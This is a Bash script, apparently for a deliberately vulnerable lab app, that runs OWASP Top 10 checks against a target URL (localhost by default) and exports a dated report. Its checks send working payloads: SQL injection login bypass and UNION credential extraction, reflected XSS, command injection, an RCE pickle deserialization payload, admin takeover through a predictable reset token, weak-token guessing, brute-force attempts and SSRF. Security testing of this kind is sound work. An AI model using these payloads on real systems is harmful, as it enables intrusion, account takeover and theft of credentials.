#!/usr/bin/env bash
# reporte_export.sh — Genera un reporte completo en .txt con fecha

TARGET="${1:-http://localhost:8080}"
OUTDIR="${2:-./reportes}"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
OUTFILE="${OUTDIR}/reporte_${TIMESTAMP}.txt"

mkdir -p "$OUTDIR"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# Función que escribe en pantalla Y en el archivo (sin códigos de color en el archivo)
log() {
  echo -e "$1"
  echo -e "$1" | sed 's/\x1B\[[0-9;]*m//g' >> "$OUTFILE"
}

divider() { log "${CYAN}──────────────────────────────────────────────────${NC}"; }

# ── Cabecera del reporte ──────────────────────────────────────
{
cat >> "$OUTFILE" << EOF
════════════════════════════════════════════════════
  REPORTE DE VULNERABILIDADES — VulnLab
  Target  : ${TARGET}
  Fecha   : $(date '+%Y-%m-%d %H:%M:%S')
  Analista: $(whoami)@$(hostname)
════════════════════════════════════════════════════

EOF
}

log "\n${BOLD}${CYAN}  VulnLab — Reporte de Exportación${NC}"
log "${CYAN}  Guardando en: ${OUTFILE}${NC}\n"

declare -a FINDINGS=()
vuln_count=0
ok_count=0

finding() {
  local sev="$1" owasp="$2" endpoint="$3" desc="$4" payload="$5"
  local color
  case "$sev" in
    CRITICO) color=$RED    ;;
    ALTO)    color=$YELLOW ;;
    MEDIO)   color=$YELLOW ;;
    *)       color=$GREEN  ;;
  esac
  log "  ${color}[${sev}]${NC} ${BOLD}${owasp}${NC} ${endpoint}"
  log "           Descripción : ${desc}"
  log "           Payload     : ${payload}"
  FINDINGS+=("${sev}|${owasp}|${endpoint}|${desc}")
  ((vuln_count++)) || true
}

ok() {
  log "  ${GREEN}[OK]${NC} $1"
  ((ok_count++)) || true
}

# ── Conectividad ──────────────────────────────────────────────
divider
log "${BOLD}1. RECONOCIMIENTO${NC}"
divider
VERSION=$(curl -sf "${TARGET}/api/health" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('app','?')+' v'+d.get('version','?'))" 2>/dev/null || echo "no disponible")
log "  Servidor activo : ${TARGET}"
log "  Aplicación      : ${VERSION}"
SERVER_HDR=$(curl -sI "${TARGET}/" 2>/dev/null | grep -i "^Server:" | tr -d '\r\n' || true)
log "  Server header   : ${SERVER_HDR:-no expuesto}"
echo "" >> "$OUTFILE"

# ── SQL Injection ─────────────────────────────────────────────
divider
log "${BOLD}2. SQL INJECTION (A03:2021)${NC}"
divider
r=$(curl -sf -X POST "${TARGET}/login" -d "username=' OR '1'='1&password=x" 2>/dev/null || true)
if echo "$r" | grep -qi "Bienvenido"; then
  finding "CRITICO" "A03" "/login" "SQL Injection — login bypass" "' OR '1'='1"
else
  ok "/login — sin SQLi detectado"
fi

r=$(curl -sf -G "${TARGET}/search" --data-urlencode "q=' UNION SELECT 1,username,password,role,email FROM users--" 2>/dev/null || true)
if echo "$r" | grep -qi "admin"; then
  finding "CRITICO" "A03" "/search" "SQL Injection UNION — extracción de usuarios" "' UNION SELECT ..."
else
  ok "/search — sin SQLi detectado"
fi
echo "" >> "$OUTFILE"

# ── XSS ──────────────────────────────────────────────────────
divider
log "${BOLD}3. XSS REFLEJADO (A03:2021)${NC}"
divider
XPAYLOAD='<script>alert(1)</script>'
r=$(curl -sf -G "${TARGET}/search" --data-urlencode "q=${XPAYLOAD}" 2>/dev/null || true)
if echo "$r" | grep -q "<script>"; then
  finding "ALTO" "A03" "/search" "XSS reflejado — payload sin encodear" "$XPAYLOAD"
else
  ok "/search — XSS mitigado"
fi
echo "" >> "$OUTFILE"

# ── Command Injection ─────────────────────────────────────────
divider
log "${BOLD}4. COMMAND INJECTION / RCE (A03:2021)${NC}"
divider
r=$(curl -sf -X POST "${TARGET}/ping" -d "host=127.0.0.1; id" 2>/dev/null || true)
if echo "$r" | grep -qi "uid="; then
  finding "CRITICO" "A03" "/ping" "RCE via command injection" "127.0.0.1; id"
  RCE_OUTPUT=$(echo "$r" | grep -o "uid=[^<]*" | head -1)
  log "           Output RCE  : ${RCE_OUTPUT}"
else
  ok "/ping — sin CMDi detectado"
fi
echo "" >> "$OUTFILE"

# ── IDOR ─────────────────────────────────────────────────────
divider
log "${BOLD}5. IDOR — ACCESO NO AUTORIZADO (A01:2021)${NC}"
divider
for id in 1 2 3; do
  r=$(curl -sf "${TARGET}/notes?id=${id}" 2>/dev/null || true)
  content=$(echo "$r" | grep -o "Nota #[^<]*" | head -1)
  if [[ -n "$content" ]]; then
    if echo "$r" | grep -qi "FLAG\|secreta"; then
      finding "CRITICO" "A01" "/notes?id=${id}" "IDOR — nota sensible del admin accesible" "id=${id}"
      log "           Contenido   : ${content}"
    else
      finding "ALTO" "A01" "/notes?id=${id}" "IDOR — nota de otro usuario accesible" "id=${id}"
    fi
  fi
done
echo "" >> "$OUTFILE"

# ── Info Disclosure ───────────────────────────────────────────
divider
log "${BOLD}6. INFORMATION DISCLOSURE (A05:2021)${NC}"
divider
r=$(curl -sf "${TARGET}/info" 2>/dev/null || true)
if echo "$r" | grep -qi "secret_key"; then
  SK=$(echo "$r" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('secret_key','?'))" 2>/dev/null || echo "?")
  finding "CRITICO" "A05" "/info" "Secret key de Flask expuesta" "${SK}"
fi
ENV_COUNT=$(echo "$r" | python3 -c "import sys,json;d=json.load(sys.stdin);print(len(d.get('env',{})))" 2>/dev/null || echo "0")
if [[ "$ENV_COUNT" -gt 0 ]]; then
  finding "ALTO" "A05" "/info" "${ENV_COUNT} variables de entorno expuestas" "GET /info"
fi
echo "" >> "$OUTFILE"

# ── Cryptographic Failures ───────────────────────────────────
divider
log "${BOLD}7. CRYPTOGRAPHIC FAILURES (A02:2021)${NC}"
divider
r=$(curl -sf "${TARGET}/crypto" 2>/dev/null || true)
if echo "$r" | grep -qi "admin123\|password\|bob123"; then
  finding "CRITICO" "A02" "/crypto" "Contraseñas en texto plano expuestas en la BD" "GET /crypto"
else
  ok "/crypto — contraseñas no expuestas"
fi
echo "" >> "$OUTFILE"

# ── Insecure Design ──────────────────────────────────────────
divider
log "${BOLD}8. INSECURE DESIGN — TOKEN PREDECIBLE (A04:2021)${NC}"
divider
r=$(curl -sf -X POST "${TARGET}/reset" -d "action=request&username=alice" 2>/dev/null || true)
if echo "$r" | grep -qi "token\|Token"; then
  finding "ALTO" "A04" "/reset" "Token de reset = ID del usuario (predecible)" "action=request&username=alice → token=2"
  r2=$(curl -sf -X POST "${TARGET}/reset" -d "action=use&token=1&new_password=hacked" 2>/dev/null || true)
  if echo "$r2" | grep -qi "actualizada\|Contraseña"; then
    finding "CRITICO" "A04" "/reset" "Toma de control de cuenta admin via token=1" "action=use&token=1"
  fi
fi
echo "" >> "$OUTFILE"

# ── Vulnerable Components ─────────────────────────────────────
divider
log "${BOLD}9. VULNERABLE AND OUTDATED COMPONENTS (A06:2021)${NC}"
divider
r=$(curl -sf "${TARGET}/components" 2>/dev/null || true)
if echo "$r" | grep -qi "Flask\|Werkzeug\|Package"; then
  PKG_COUNT=$(echo "$r" | grep -c "<tr>" 2>/dev/null || echo "?")
  finding "MEDIO" "A06" "/components" "Listado completo de paquetes instalados expuesto" "GET /components"
  FLASK_VER=$(echo "$r" | grep -i "Flask" | grep -o "[0-9][0-9.]*" | head -1)
  [[ -n "$FLASK_VER" ]] && log "           Flask version: ${FLASK_VER}"
else
  ok "/components — versiones no expuestas"
fi
echo "" >> "$OUTFILE"

# ── Auth Failures ─────────────────────────────────────────────
divider
log "${BOLD}10. IDENTIFICATION AND AUTH FAILURES (A07:2021)${NC}"
divider
for tok in admin token secret token123 12345; do
  r=$(curl -sf "${TARGET}/api/users" -H "X-Token: ${tok}" 2>/dev/null || true)
  if echo "$r" | grep -qi "admin\|alice"; then
    finding "ALTO" "A07" "/api/users" "Token débil hardcodeado: ${tok}" "X-Token: ${tok}"
    break
  fi
done
for i in $(seq 1 6); do
  curl -sf -X POST "${TARGET}/auth" -d "username=admin&password=brute${i}" > /dev/null 2>&1 || true
done
r=$(curl -sf -X POST "${TARGET}/auth" -d "username=admin&password=brute_final" 2>/dev/null || true)
if echo "$r" | grep -qi "intento\|sin bloqueo"; then
  finding "ALTO" "A07" "/auth" "Sin bloqueo tras múltiples intentos fallidos" "6+ intentos sin lockout"
fi
echo "" >> "$OUTFILE"

# ── Deserialization ──────────────────────────────────────────
divider
log "${BOLD}11. INSECURE DESERIALIZATION (A08:2021)${NC}"
divider
PICKLE=$(python3 -c "
import pickle,os,base64
class R:
    def __reduce__(self): return (os.system,('echo DESER_OK',))
print(base64.b64encode(pickle.dumps(R())).decode())" 2>/dev/null)
r=$(curl -sf -X POST "${TARGET}/deserialize" -d "data=${PICKLE}" 2>/dev/null || true)
if echo "$r" | grep -qi "DESER_OK\|Objeto deserializado"; then
  finding "CRITICO" "A08" "/deserialize" "pickle.loads() ejecuta código arbitrario" "base64(pickle_rce)"
else
  ok "/deserialize — sin ejecución detectada"
fi
echo "" >> "$OUTFILE"

# ── SSRF ─────────────────────────────────────────────────────
divider
log "${BOLD}12. SSRF (A10:2021)${NC}"
divider
r=$(curl -sf -G "${TARGET}/fetch" --data-urlencode "url=http://127.0.0.1:5000/info" 2>/dev/null || true)
if echo "$r" | grep -qi "secret_key\|Respuesta"; then
  finding "ALTO" "A10" "/fetch" "SSRF — acceso a servicio interno" "url=http://127.0.0.1:5000/info"
else
  ok "/fetch — sin SSRF detectado con URL interna"
fi
echo "" >> "$OUTFILE"

# ── Resumen final ─────────────────────────────────────────────
divider
log "${BOLD}RESUMEN EJECUTIVO${NC}"
divider
log "  Total vulnerabilidades : ${RED}${vuln_count}${NC}"
log "  Checks OK              : ${GREEN}${ok_count}${NC}"
log ""
log "  ${BOLD}Hallazgos por severidad:${NC}"

crit=0; alto=0; medio=0
for f in "${FINDINGS[@]}"; do
  sev=$(echo "$f" | cut -d'|' -f1)
  case "$sev" in
    CRITICO) ((crit++))  || true ;;
    ALTO)    ((alto++))  || true ;;
    MEDIO)   ((medio++)) || true ;;
  esac
done

log "    ${RED}CRÍTICO : ${crit}${NC}"
log "    ${YELLOW}ALTO    : ${alto}${NC}"
log "    ${YELLOW}MEDIO   : ${medio}${NC}"
log ""
log "  Reporte guardado en: ${OUTFILE}"
divider

echo -e "\n${GREEN}✓ Reporte exportado:${NC} ${OUTFILE}"

PYTHON_BIN="${PYTHON_BIN:-python3}"
if command -v "$PYTHON_BIN" >/dev/null 2>&1; then
  "$PYTHON_BIN" "$(cd "$(dirname "$0")" && pwd)/generate_html_report.py" --input "$OUTFILE" >/dev/null 2>&1 || true
else
  python "$(cd "$(dirname "$0")" && pwd)/generate_html_report.py" --input "$OUTFILE" >/dev/null 2>&1 || true
fi
